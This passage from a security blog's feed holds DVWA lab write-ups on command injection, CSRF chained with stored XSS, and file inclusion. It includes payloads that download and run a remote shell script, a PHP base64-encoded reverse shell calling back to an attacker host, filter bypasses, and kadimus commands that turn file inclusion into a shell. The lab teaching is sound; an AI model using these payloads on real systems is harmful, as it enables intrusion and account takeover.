<p><img src="/assets/img/20220323182443.png" alt="" /></p>

<p>However, injecting any command that has a whitespace appears to fail;</p>

<p><img src="/assets/img/20220323182510.png" alt="" /></p>

<p>This indicate there may be a filter that blocks input that contain whitespaces. Since we know it’s a linux host, we may be able to bypass this using the <em>internal field separator</em> (IFS) environment variable, which is <code class="language-plaintext highlighter-rouge">$IFS</code>. In my bash shell, this is set to a newline character <code class="language-plaintext highlighter-rouge">0x0a</code>;</p>

<p><img src="/assets/img/20220323182828.png" alt="" /></p>

<p>To my surprise, using the <code class="language-plaintext highlighter-rouge">$IFS</code> variable to bypass the filter didn’t work. However, while the command <code class="language-plaintext highlighter-rouge">ls -al</code> failed, the command <code class="language-plaintext highlighter-rouge">ls /</code> actually succeeded, which indicate whitespace is likely not what the filter is targetting. The only difference I can see between these two commands is the hyphen character (<code class="language-plaintext highlighter-rouge">-</code>).</p>

<p>If the application is indeed blocking the user of <code class="language-plaintext highlighter-rouge">-</code>, I can no longer use my base64-encoded reverse shell because I need to decode it using <code class="language-plaintext highlighter-rouge">base64 -d</code>. Checking the box for tools we can take advantage of, <code class="language-plaintext highlighter-rouge">wget</code> was found;</p>

<p><img src="/assets/img/20220323210702.png" alt="" /></p>

<p>I can download a file to current directory with<code class="language-plaintext highlighter-rouge">wget</code> without using any <code class="language-plaintext highlighter-rouge">-</code> character. So created a bash script on my box containing my reverse shell payload, and host it using python’s web server;</p>

<p><img src="/assets/img/20220323210841.png" alt="" /></p>

<p>Using the payload <code class="language-plaintext highlighter-rouge">|| wget http://172.17.0.1/shell.sh</code>, I was able to download it to the box. I then made it executable with <code class="language-plaintext highlighter-rouge">|| chmod +x shell.sh</code>, and ran it using <code class="language-plaintext highlighter-rouge">|| ./shell.sh</code>. This gave me a shell on the box;</p>

<p><img src="/assets/img/20220323211103.png" alt="" /></p>

<p><img src="/assets/img/20220323211202.png" alt="" /></p>

<p><img src="/assets/img/20220323211249.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="command injection" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for command injection.]]></summary></entry><entry><title type="html">CSRF + Stored XSS - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss.html" rel="alternate" type="text/html" title="CSRF + Stored XSS - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_csrf_plus_xss.html"><![CDATA[<p>This is an exercise in OWASP DVWA where I chained Stored XSS with CSRF.</p>

<p><br /></p>

<h3 id="csrf-and-stored-xss---dvwa">CSRF and Stored XSS - DVWA</h3>
<p><br /></p>

<p>For this challenge, we will be chaining the CSRF vulnerability with stored XSS vulnerability since there is no other way to make another user in the application interact with our payload. We will be using the account of <strong>smithy</strong>, whose password is <code class="language-plaintext highlighter-rouge">password</code>, to target the user <strong>admin</strong>, which I am logged into in a private window.</p>

<p><br /></p>

<h4 id="difficulty-easy">Difficulty: Easy</h4>
<p><br /></p>

<p>For this mode, we are presented with a simple password reset form;</p>

<p><img src="/assets/img/20220324074556.png" alt="" /></p>

<p>Note that the form does not ask users to input their current passwords, and no CSRF token is used. The data is also submitted in a GET request, which will make it more convenient to exploit;</p>

<p><img src="/assets/img/20220324074734.png" alt="" /></p>

<p><img src="/assets/img/20220324074750.png" alt="" /></p>

<p>As the user <em>smithy</em>, I added a stored XSS payload that will reset the password of any user that visit the page to <code class="language-plaintext highlighter-rouge">hacked</code>;</p>

<p><img src="/assets/img/20220324075501.png" alt="" /></p>

<p>Going to the page as the user <strong>admin</strong>, we got some broken image thumbnail;</p>

<p><img src="/assets/img/20220324075616.png" alt="" /></p>

<p>So I tried to login using <code class="language-plaintext highlighter-rouge">admin:hacked</code>, and it worked!</p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>Again, we were presented with the same form with no CSRF tokens or requirement to input current password. Attempt to exploit stored XSS in the <code class="language-plaintext highlighter-rouge">txtName</code> gave an error;</p>

<p><img src="/assets/img/20220324080456.png" alt="" /></p>

<p>Doing it in the <code class="language-plaintext highlighter-rouge">mtxMessage</code> field blanked out the body;</p>

<p><img src="/assets/img/20220324080753.png" alt="" /></p>

<p>Since the <code class="language-plaintext highlighter-rouge">txtName</code> field is only complaining about the length of the input, we could exploit this by setting up a short URL that redirect to our target URL. So I built a simple python program that can handle the redirect;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-------------------------------------------------------
# A simple script for setting up a static HTTP redirect.
#                      Author: https://4g3nt47.github.io
#-------------------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">threading</span>

<span class="c1"># Called in a separate thread. Handles the redirection.
</span><span class="k">def</span> <span class="nf">redirect</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">target_url</span><span class="p">):</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">9999</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s">"HTTP/1.1 302 Found</span><span class="se">\r\n</span><span class="s">Server: Apache/2.4.38</span><span class="se">\r\n</span><span class="s">Content-Length: 0</span><span class="se">\r\n</span><span class="s">Location: </span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="se">\n\r\n\r\n</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="c1"># Our main function.
</span><span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span> <span class="n">target_url</span><span class="p">):</span>
  <span class="c1"># Create the socket server.
</span>  <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
  <span class="n">s</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">))</span>
  <span class="n">s</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Listening...."</span><span class="p">)</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
      <span class="c1"># Spawn a thread for the client.
</span>      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[*] Redirecting </span><span class="si">{</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s">..."</span><span class="p">)</span>
      <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">redirect</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">target_url</span><span class="p">))</span>
      <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
      <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
      <span class="k">break</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[-] Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;lhost&gt; &lt;lport&gt; &lt;target_url&gt;"</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]),</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
  <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Testing it locally with <code class="language-plaintext highlighter-rouge">curl</code>, my program seems to be working;</p>

<p><img src="/assets/img/20220324084227.png" alt="" /></p>

<p>Now we can set our stored XSS exploit to redirect user to our HTTP redirector, which will further redirect to our CSRF URL. The first redirect can be achieved using <code class="language-plaintext highlighter-rouge">&lt;img&gt;</code> tag with a broken URL that executes the JS code defined by <code class="language-plaintext highlighter-rouge">onerror</code>;</p>

<p><img src="/assets/img/20220324084649.png" alt="" /></p>

<p><img src="/assets/img/20220324084837.png" alt="" /></p>

<p>Going to the XSS page as <strong>admin</strong>, our exploit was triggered;</p>

<p><img src="/assets/img/20220324085046.png" alt="" /></p>

<p><img src="/assets/img/20220324085206.png" alt="" /></p>

<p>The password reset worked, but the exploit is very obvious. So I tried doing it with the payload <code class="language-plaintext highlighter-rouge">&lt;img src='&lt;my-redirectors-URL&gt;'/&gt;</code>, and it worked. This is much more stealthier since target is not <em>visibly</em> redirected.</p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>Same password reset form as the previous levels, and the XSS payload used in [[#Difficulty Medium]] worked for this level too;</p>

<p><img src="/assets/img/20220324093512.png" alt="" /></p>

<p><img src="/assets/img/20220324093458.png" alt="" /></p>

<p>Going to the stored XSS infected page changed the password of <em>admin</em> to <code class="language-plaintext highlighter-rouge">hacked3</code>.</p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="stored xss" /><category term="csrf" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA where I chained Stored XSS with CSRF.]]></summary></entry><entry><title type="html">File Inclusion - DVWA</title><link href="https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion.html" rel="alternate" type="text/html" title="File Inclusion - DVWA" /><published>2022-03-27T00:00:00+01:00</published><updated>2022-03-27T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion</id><content type="html" xml:base="https://4g3nt47.github.io/posts/dvwa/dvwa_file_inclusion.html"><![CDATA[<p>This is an exercise in OWASP DVWA for local and remote file inclusion.</p>

<p><br /></p>

<h3 id="file-inclusion---dvwa">File Inclusion - DVWA</h3>
<p><br /></p>

<h4 id="difficulty-low">Difficulty: Low</h4>
<p><br /></p>

<p>In this mode, we are presented with <strong>3</strong> URLs, both of which accept a filename as a value to the GET parameter <code class="language-plaintext highlighter-rouge">page</code>;</p>

<p><img src="/assets/img/20220324114353.png" alt="" /></p>

<p><img src="/assets/img/20220324114404.png" alt="" /></p>

<p>Changing the value to <code class="language-plaintext highlighter-rouge">/etc/hostname</code> gave me the hostname of the box, along with the rest of the page;</p>

<p><img src="/assets/img/20220324114631.png" alt="" /></p>

<p>That’s cool and all, but we want to see if we can get RCE using this <em>file inclusion</em> vulnerability. Since the default files assigned to the <code class="language-plaintext highlighter-rouge">page</code> parameter all end with <code class="language-plaintext highlighter-rouge">.php</code>, and no PHP code was seen in the HTML returned by the server, this indicate the file is not just read, but processed as PHP code. This means we can get code execution if we can trick the application into loading a malicious PHP file.</p>

<p>So I started testing for <em>remote file inclusion</em> vulnerability, which will make it much easier to execute arbitrary code, and it was found to be vulnerable;</p>

<p><img src="/assets/img/20220324115551.png" alt="" /></p>

<p><img src="/assets/img/20220324115607.png" alt="" /></p>

<p>So I created a PHP file that will execute a bash reverse shell, and saved it as <code class="language-plaintext highlighter-rouge">shell.php</code>;</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0NDQgMD4mMQ== | base64 -d | bash"</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Going to the URL <code class="language-plaintext highlighter-rouge">http://buster/dvwa/vulnerabilities/fi/?page=http://172.17.0.1/shell.php</code> gave me a shell on the box;</p>

<p><img src="/assets/img/20220324115844.png" alt="" /></p>

<p><img src="/assets/img/20220324115859.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-medium">Difficulty: Medium</h4>
<p><br /></p>

<p>In this mode, LFI was achieved by setting <code class="language-plaintext highlighter-rouge">page=/etc/hostname</code>;</p>

<p><img src="/assets/img/20220324120217.png" alt="" /></p>

<p>However, RFI no longer works when supplying a HTTP URL. This is probably due to some sort of filter the application is using. Fun fact about URL protocols: they are <strong>case insensitive</strong>. So <code class="language-plaintext highlighter-rouge">http://somehost.tld</code> is same as <code class="language-plaintext highlighter-rouge">HTTP://somehost.tld</code>. This could be used to easily bypass filters that do not account for this. Testing this on the application, i was able to achieve RFI, and gain code execution;</p>

<p><img src="/assets/img/20220324120753.png" alt="" /></p>

<p><img src="/assets/img/20220324120807.png" alt="" /></p>

<p><br /></p>

<h4 id="difficulty-high">Difficulty: High</h4>
<p><br /></p>

<p>None of our previous LFI and RFI payloads work in this level. I was able to achieve LFI on the application using the <code class="language-plaintext highlighter-rouge">file:///</code> protocol;</p>

<p><img src="/assets/img/20220324121427.png" alt="" /></p>

<p>Testing for file inclusion using <code class="language-plaintext highlighter-rouge">php://filter/convert.base64-encode/resource=&lt;file&gt;</code>, which could have being used to read the source code of the application for analysis, kept failing.</p>

<p>The LFI is still enough for RCE if we can chain it we any other vulnerability that allow us to write files on the server, and <em>DVWA</em> is vulnerable to arbitrary file upload.</p>

<p><br /></p>

<h4 id="bonus-lfi-to-rce-with-kadimus">Bonus: LFI to RCE with Kadimus</h4>
<p><br /></p>

<p><strong>Kadimus</strong> is a nice tool that can be used to easily scan for and exploit LFI vulnerabilities, and you can install it from <a href="https://github.com/P0cL4bs/kadimus">github</a>.</p>

<p>Running the tool using the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>kadimus <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/fi/?page=include.php'</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8'</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">kadimus</code> was able to detect a few ways the application is vulnerable to LFI;</p>

<p><img src="/assets/img/20220327092755.png" alt="" /></p>

<p>Best thing about <code class="language-plaintext highlighter-rouge">kadimus</code> is it makes it very easy to go from LFI to <em>code execution</em>. Using the <em>data wrap</em> technique, this can be exploited with the command;</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>kadimus <span class="nt">-u</span> <span class="s1">'http://buster/dvwa/vulnerabilities/fi/?page=include.php'</span> <span class="nt">--cookie</span> <span class="s1">'security=low; PHPSESSID=p40eq58f52c6e08rku3gb6leb8'</span> <span class="nt">-T</span> data <span class="nt">--parameter</span> page <span class="nt">--shell</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This gave me a shell on the box;</p>

<p><img src="/assets/img/20220327092942.png" alt="" /></p>

<p>The shell you get with <code class="language-plaintext highlighter-rouge">kadimus</code> is stateless, so you may want to upgrade to a proper shell as soon as you have code execution;</p>

<p><img src="/assets/img/20220327093253.png" alt="" /></p>]]></content><author><name></name></author><category term="dvwa" /><category term="dvwa" /><category term="lfi" /><category term="rfi" /><category term="rce" /><category term="kadiums" /><summary type="html"><![CDATA[This is an exercise in OWASP DVWA for local and remote file inclusion.]]></summary></entry></feed>